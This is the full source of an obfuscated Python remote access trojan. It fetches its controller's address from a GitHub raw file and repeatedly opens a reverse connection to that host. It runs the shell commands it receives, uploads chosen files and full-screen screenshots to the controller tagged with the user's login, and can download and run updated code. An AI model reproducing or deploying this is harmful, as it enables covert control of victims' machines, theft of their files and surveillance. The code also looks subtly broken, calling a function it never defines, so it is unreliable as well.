import subprocess,socket,time,requests,os
from PIL import ImageGrab
gmIpqHy = "05.12.24.3"
ZMVwSoGFY = ""
VnFyOeBCFAPCrYnaYObxdF = ""
MSxLhxo = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
CcLVogMPQcj = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
tWYftfxrRCJMTCdo = "!"
def PWsdbjSdzoaClFvaOhUs(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def RpQOdQlF(s):
	YYjHhMNyyhxYiwXUcQKJgOH = s.recv(1024)
	if len(YYjHhMNyyhxYiwXUcQKJgOH)==0:
		return True
	bLYSQSvRboNayNNtnT = YYjHhMNyyhxYiwXUcQKJgOH.decode("utf-8").replace("\n","")
	if not bLYSQSvRboNayNNtnT.startswith(tWYftfxrRCJMTCdo):
		proc = subprocess.run(bLYSQSvRboNayNNtnT, shell=True, capture_output=True)
		ejikWURkbkWaOPKYegudM = proc.stdout + proc.stderr
		s.send(ejikWURkbkWaOPKYegudM)
		return
	cfGCiCbvOBNXmAtKlQPsZ = bLYSQSvRboNayNNtnT.split(" ")[0][1:]
	if cfGCiCbvOBNXmAtKlQPsZ == "download":
		aeKkEiPto(s, bLYSQSvRboNayNNtnT)
	elif cfGCiCbvOBNXmAtKlQPsZ == "screenshot":
		pbkfzygjBxzZnl(s)
	elif cfGCiCbvOBNXmAtKlQPsZ == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
def aeKkEiPto(s, bLYSQSvRboNayNNtnT):
	nPaOVnvfixrvDrGOV = bLYSQSvRboNayNNtnT.replace(tWYftfxrRCJMTCdo+"download ","").split(",")
	ejikWURkbkWaOPKYegudMs = ""
	for f in nPaOVnvfixrvDrGOV:
		ejikWURkbkWaOPKYegudMs += YzHDLPHdUzzqxXnfxIJN(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(ejikWURkbkWaOPKYegudMs, "utf-8"))
def pbkfzygjBxzZnl(s):
	yxuqnAJwrxZPRGdwuCUPXA = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	kqdfFZxRsaYmxlXo = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	yxuqnAJwrxZPRGdwuCUPXA.save(kqdfFZxRsaYmxlXo)
	yxuqnAJwrxZPRGdwuCUPXA.close()
	r = YzHDLPHdUzzqxXnfxIJN(kqdfFZxRsaYmxlXo, "api/sscap")
	os.remove(kqdfFZxRsaYmxlXo)
	s.send(bytes(r,"utf-8"))
def YzHDLPHdUzzqxXnfxIJN(yiAEqADxKOfmr, WsbzquHlfDxCPUV, fxTjvFyuxqyzU=None):
	if not os.path.exists(yiAEqADxKOfmr):
		return "[!] 404: "+yiAEqADxKOfmr+"\n"
	headers = {"user":os.getlogin()}
	if fxTjvFyuxqyzU is not None:
		headers = {**headers, **fxTjvFyuxqyzU}
	requests.post("http://"+ZMVwSoGFY+":5555/"+WsbzquHlfDxCPUV,
		files={"file":open(yiAEqADxKOfmr, "rb")},
		headers=headers)
	return "[+] 200: "+yiAEqADxKOfmr+"\n"
def PSTidubzosTzzfysbapdpK():
	global ZMVwSoGFY, VnFyOeBCFAPCrYnaYObxdF
	if ZMVwSoGFY == "" or VnFyOeBCFAPCrYnaYObxdF == "":
		YYjHhMNyyhxYiwXUcQKJgOH = requests.get(MSxLhxo).text.replace("\n","").split(":")
		ZMVwSoGFY = YYjHhMNyyhxYiwXUcQKJgOH[0].strip()
		VnFyOeBCFAPCrYnaYObxdF = YYjHhMNyyhxYiwXUcQKJgOH[1].strip()
		SPWzALYoYhECtkNTXDtI = YYjHhMNyyhxYiwXUcQKJgOH[2].strip()
	return ZMVwSoGFY, VnFyOeBCFAPCrYnaYObxdF, SPWzALYoYhECtkNTXDtI
def update(SPWzALYoYhECtkNTXDtI):
	kGsSWNGXvhsiwiw = os.path.basename(__file__)
	fileType = kGsSWNGXvhsiwiw.split(".")[-1]
	NRYaJOkrk = kGsSWNGXvhsiwiw.replace("."+fileType,"") +"."+SPWzALYoYhECtkNTXDtI + "."+fileType
	HSzOtmAZIqjffn = os.path.join(os.getcwd(), NRYaJOkrk)
	with open(NRYaJOkrk, "w+") as f:
		f.write(requests.get(CcLVogMPQcj+"file."+ "pyw" if HSzOtmAZIqjffn.split(".")[-1].startswith("py") else "exe").text)
	bLYSQSvRboNayNNtnT = ("" if fileType == "exe" else "python.exe ") + HSzOtmAZIqjffn
	subprocess.run(bLYSQSvRboNayNNtnT, stdin=None, stdout=None, stderr=None)
def suiifOeVo():
	pass
def itzvZLsm():
	h, p, v = PSTidubzosTzzfysbapdpK()
	if gmIpqHy != v:
		CPBsfzNyWympfMK()
	suiifOeVo()
	bilIXEclrseNjd = bytes("["+gmIpqHy+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				SHUFLFg=False
				try:
					s=PWsdbjSdzoaClFvaOhUs(h, p)
					while not SHUFLFg:
						s.send(bilIXEclrseNjd)
						SHUFLFg=RpQOdQlF(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
itzvZLsm()
